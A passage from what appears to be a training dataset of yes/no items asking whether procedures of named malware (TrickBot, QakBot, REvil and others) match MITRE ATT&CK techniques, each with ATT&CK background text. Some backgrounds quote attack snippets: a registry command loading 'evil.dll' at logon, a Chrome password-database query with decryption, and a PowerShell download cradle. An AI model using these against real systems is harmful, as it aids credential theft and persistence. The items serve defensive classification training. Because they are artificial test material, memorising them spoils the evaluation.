      "background": "Brute Force: Credential Stuffing: Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.",
      "question": "Is procedure TrickBot uses brute-force attack against RDP with rdpscanDll module.  related to technique Brute Force: Credential Stuffing",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine..\nQ: Is procedure TeamTNT has searched for system version, architecture, disk partition, logical volume, and hostname information. a type of technique System Information Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure TeamTNT has searched for system version, architecture, disk partition, logical volume, and hostname information. a type of technique System Information Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure QakBot can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.  related to technique Input Capture: Credential API Hooking",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Injection: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "question": "Is procedure QakBot can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.  related to technique Input Capture: Credential API Hooking",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Unix Shell: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence..\nAnswer in Yes or No.\n\nQuestion: Is procedure Exaramel for Linux has a command to execute a shell command on the system.  related to technique Command and Scripting Interpreter: Unix Shell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Unix Shell: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
      "question": "Is procedure Exaramel for Linux has a command to execute a shell command on the system.  related to technique Command and Scripting Interpreter: Unix Shell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Winnti for Windows can add a service named <code>wind0ws</code> to the Registry to achieve persistence after reboot.  related to technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "question": "Is procedure Winnti for Windows can add a service named <code>wind0ws</code> to the Registry to achieve persistence after reboot.  related to technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Data from Network Shared Drive: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information..\nAnswer in Yes or No.\n\nQuestion: Is procedure Chimera has collected data of interest from network shares. a type of technique Adversary-in-the-Middle: ARP Cache Poisoning",
    "context": "",
    "output": "No.\nThe correct answer is Data from Network Shared Drive",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data from Network Shared Drive: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",
      "question": "Is procedure Chimera has collected data of interest from network shares. a type of technique Adversary-in-the-Middle: ARP Cache Poisoning",
      "yes/no": "No.\nThe correct answer is Data from Network Shared Drive",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure ROKRAT can steal credentials stored in Web browsers by querying the sqlite database. a type of technique Credentials from Password Stores: Credentials from Web Browsers.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Credentials from Password Stores: Credentials from Web Browsers: Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "question": "Is procedure ROKRAT can steal credentials stored in Web browsers by querying the sqlite database. a type of technique Credentials from Password Stores: Credentials from Web Browsers",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Cardinal RAT can download and execute additional payloads.  related to technique File and Directory Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure Cardinal RAT can download and execute additional payloads.  related to technique File and Directory Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure REvil can encrypt files on victim systems and demands a ransom to decrypt the files. a type of technique Steal or Forge Kerberos Tickets: Kerberoasting.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Data Encrypted for Impact",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Encrypted for Impact: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "question": "Is procedure REvil can encrypt files on victim systems and demands a ransom to decrypt the files. a type of technique Steal or Forge Kerberos Tickets: Kerberoasting",
      "yes/no": "No.\nThe provided context is related to Data Encrypted for Impact",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure TA2541 has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub.  related to technique Command and Scripting Interpreter: JavaScript",
    "context": "",
    "output": "No.\nThe provided context is correlated with Stage Capabilities: Upload Malware",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Stage Capabilities: Upload Malware: Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.",
      "question": "Is procedure TA2541 has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub.  related to technique Command and Scripting Interpreter: JavaScript",
      "yes/no": "No.\nThe provided context is correlated with Stage Capabilities: Upload Malware",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Valak has the ability to decode and decrypt downloaded files.  related to technique Non-Standard Port",
    "context": "",
    "output": "No.\nThe provided context is correlated with Deobfuscate/Decode Files or Information",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Deobfuscate/Decode Files or Information: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "question": "Is procedure Valak has the ability to decode and decrypt downloaded files.  related to technique Non-Standard Port",
      "yes/no": "No.\nThe provided context is correlated with Deobfuscate/Decode Files or Information",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Proxy: Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic..\nQ: Is procedure QuasarRAT can communicate over a reverse proxy using SOCKS5.  related to technique Proxy.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Proxy: Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
      "question": "Is procedure QuasarRAT can communicate over a reverse proxy using SOCKS5.  related to technique Proxy",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Obfuscated Files or Information: Binary Padding: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed..\nAnswer in Yes or No.\n\nQuestion: Is procedure FinFisher contains junk code in its functions in an effort to confuse disassembly programs. a type of technique Obfuscated Files or Information: Binary Padding",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Binary Padding: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
      "question": "Is procedure FinFisher contains junk code in its functions in an effort to confuse disassembly programs. a type of technique Obfuscated Files or Information: Binary Padding",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Axiom has used steganography to hide its C2 communications. a type of technique Create or Modify System Process: Windows Service",
    "context": "",
    "output": "No.\nThe provided context is correlated with Data Obfuscation: Steganography",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Obfuscation: Steganography: Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
      "question": "Is procedure Axiom has used steganography to hide its C2 communications. a type of technique Create or Modify System Process: Windows Service",
      "yes/no": "No.\nThe provided context is correlated with Data Obfuscation: Steganography",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure KeyBoy can gather extended system information, such as information about the operating system, disks, and memory. a type of technique System Information Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure KeyBoy can gather extended system information, such as information about the operating system, disks, and memory. a type of technique System Information Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.  related to technique Virtualization/Sandbox Evasion: System Checks.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Virtualization/Sandbox Evasion: System Checks: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
      "question": "Is procedure NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.  related to technique Virtualization/Sandbox Evasion: System Checks",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure RCSession has the ability to capture keystrokes on a compromised host. a type of technique Input Capture: Keylogging.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Input Capture: Keylogging: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "question": "Is procedure RCSession has the ability to capture keystrokes on a compromised host. a type of technique Input Capture: Keylogging",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.  related to technique Proxy.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Create or Modify System Process: Windows Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Create or Modify System Process: Windows Service: Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via Native API functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege 